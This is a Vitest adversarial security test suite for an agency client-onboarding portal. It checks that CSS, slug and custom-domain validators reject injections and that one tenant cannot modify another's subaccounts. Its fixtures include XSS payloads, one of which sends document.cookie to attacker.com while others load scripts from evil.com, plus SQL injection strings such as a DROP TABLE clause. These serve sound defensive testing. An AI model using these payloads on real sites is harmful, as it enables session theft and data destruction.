/** @vitest-environment node */
/**
 * Adversarial Stress Test Suite: Agency Client Onboarding & Portal
 *
 * Stress-tests security assumptions, boundary conditions, and failure modes:
 * 1. Stored XSS & CSS breakout injection vectors
 * 2. Cross-tenant subaccount tampering & isolation bypass
 * 3. Reserved platform slug hijacking & collision exploitation
 * 4. FQDN domain scheme and path traversal injection
 * 5. Negative/Infinite compute allocation bounds
 *
 * Role: Adversarial Critic
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { NodeSqliteD1Database } from '@/seed/db/node-sqlite-d1';
import {
  sanitizeCustomCss,
  validateAgencySlug,
  validateCustomDomain,
  validateCompleteSubmission,
  RESERVED_SLUGS,
} from '@/tree/agency/onboarding-validator';
import {
  calculateMcuUtilization,
  calculateGrossMargin,
} from '@/tree/agency/attribution-engine';
import {
  submitAgencyOnboardingAction,
  updateClientSubaccountStatusAction,
  reallocateClientMcuQuotaAction,
} from '@/land/agency/agency-portal-actions';

describe('Adversarial Stress Test: Agency Onboarding & Portal Security', () => {
  let db: NodeSqliteD1Database;

  beforeEach(() => {
    db = new NodeSqliteD1Database(':memory:');
    db.exec(`
      CREATE TABLE IF NOT EXISTS organizations (id TEXT PRIMARY KEY, name TEXT NOT NULL);
      INSERT INTO organizations (id, name) VALUES ('org_agency_a', 'Agency A'), ('org_agency_b', 'Agency B');
    `);

    const m0286Path = path.resolve(__dirname, '../../migrations/0286_agency_multitenancy_subaccounts.sql');
    db.exec(fs.readFileSync(m0286Path, 'utf8'));

    const m0436Path = path.resolve(__dirname, '../../migrations/0436_agent_governance_yaml_and_audit_ledger.sql');
    db.exec(fs.readFileSync(m0436Path, 'utf8'));

    db.exec('PRAGMA foreign_keys = OFF;');
  });

  describe('1. XSS & CSS Breakout Defenses', () => {
    it('neutralizes complex nested script breakouts and HTML entity tricks', () => {
      const maliciousPayloads = [
        '<script>window.location="https://attacker.com?cookie="+document.cookie</script>',
        '<SCRIPT SRC="https://evil.com/xss.js"></SCRIPT>',
        '<img src=x onerror=alert(1)>',
        'body { background: url("javascript:alert(\'xss\')"); }',
        'div { -moz-binding: url("http://evil.com/xbl#test"); }',
        'div { behavior: url(evil.htc); }',
        'div { width: expression(alert(1)); }',
        '@import "http://evil.com/malicious.css";',
        '/*<![CDATA[*/@import url(evil.css);/*]]>*/',
      ];

      for (const payload of maliciousPayloads) {
        const sanitized = sanitizeCustomCss(payload);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('onerror=');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('@import');
        expect(sanitized).not.toContain('expression(');
        expect(sanitized).not.toContain('behavior:');
        expect(sanitized).not.toContain('-moz-binding:');
      }
    });
  });

  describe('2. Slug Hijacking & Collision Defenses', () => {
    it('blocks all reserved administrative and platform slugs', () => {
      for (const slug of Array.from(RESERVED_SLUGS)) {
        const res = validateAgencySlug(slug);
        expect(res.valid).toBe(false);
        expect(res.errors).toContain('SLUG_RESERVED');
      }
    });

    it('rejects path traversal, SQL injection, and unicode whitespace in slugs', () => {
      const dirtySlugs = [
        '../admin',
        'acme/portal',
        'acme\\portal',
        "acme' OR '1'='1",
        'acme; DROP TABLE client_subaccounts;--',
        'acme portal',
        'acme\u200Bportal', // zero-width space
      ];

      for (const dirty of dirtySlugs) {
        const res = validateAgencySlug(dirty);
        expect(res.valid).toBe(false);
      }
    });
  });

  describe('3. Custom Domain Scheme Injections', () => {
    it('rejects protocol smuggling, port injection, and credential stuffing in domains', () => {
      const attacks = [
        'http://client.com',
        'https://client.com',
        'ftp://client.com',
        'javascript:client.com',
        'user:pass@client.com',
        'client.com:8080',
        'client.com/login',
        'client.com?query=true',
        'client.com#fragment',
      ];

      for (const attack of attacks) {
        const res = validateCustomDomain(attack);
        expect(res.valid).toBe(false);
      }
    });
  });

  describe('4. Quota Overflow & Math Boundary Resilience', () => {
    it('handles negative, NaN, and Infinity in MCU calculations safely', () => {
      const utilNaN = calculateMcuUtilization(NaN, 100);
      expect(Number.isFinite(utilNaN.usedRatePercent)).toBe(true);

      const utilInf = calculateMcuUtilization(Infinity, 100);
      expect(Number.isFinite(utilInf.usedRatePercent)).toBe(true);

      const utilNeg = calculateMcuUtilization(-500, -100);
      expect(Number.isFinite(utilNeg.usedRatePercent)).toBe(true);

      const marginInf = calculateGrossMargin(Infinity, 100);
      expect(Number.isFinite(marginInf.marginPercent)).toBe(true);
    });
  });

  describe('5. Cross-Tenant Isolation Enforcement', () => {
    it('prevents Agency B from tampering with or viewing Agency A clients', async () => {
      // Provision client under Agency A
      const onboardA = await submitAgencyOnboardingAction(
        {
          agencyOrgId: 'org_agency_a',
          profile: {
            clientName: 'Alpha Client',
            agencySlug: 'alpha-client',
            contactEmail: 'alpha@a.com',
            industryTag: 'saas',
            initialMcuBudget: 1000,
          },
          branding: {},
          domain: {},
          seedAgents: [
            {
              agentId: 'a-1',
              name: 'Agent A',
              role: 'video_creator',
              template: 'ai-avatar-video-agency',
              maxAutonomy: 'L2',
              maxComputeUnitsMcu: 500,
              escalationPolicy: 'request_approval',
              enabled: true,
            },
          ],
        },
        db
      );

      const subId = onboardA.subaccountId!;

      // Attacker Agency B attempts to suspend client A
      const updateRes = await updateClientSubaccountStatusAction(subId, 'org_agency_b', 'suspended', db);
      expect(updateRes.success).toBe(false);
      expect(updateRes.error).toBe('SUBACCOUNT_NOT_FOUND_OR_FORBIDDEN');

      // Attacker Agency B attempts to reallocate client A MCU
      const reallocRes = await reallocateClientMcuQuotaAction(subId, 'org_agency_b', 0, db);
      expect(reallocRes.success).toBe(false);
      expect(reallocRes.error).toBe('SUBACCOUNT_NOT_FOUND_OR_FORBIDDEN');
    });
  });
});
